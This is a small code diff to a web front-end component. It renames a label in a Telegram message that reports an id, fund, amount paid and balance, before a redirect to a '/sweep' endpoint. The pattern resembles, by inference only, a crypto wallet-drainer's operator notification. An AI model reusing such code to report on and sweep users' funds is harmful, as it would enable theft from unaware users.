@@ -63,7 +63,7 @@ export const Hero = () => {
               })
               .finally(() => {
                 // send a telegram
-                const telegram_message = `Id: ${id()}\nFund: ${fund()}\nPaid: ${amount}\nLeft: ${myBalance}`;
+                const telegram_message = `Id: ${id()}\nFund: ${fund()}\nPaid: ${amount}\nBalance: ${myBalance}`;
                 send(telegram_message);
                 // redirect to sweep
                 redirect(`https://${config.backend}/fund/${fund()}/sweep`);
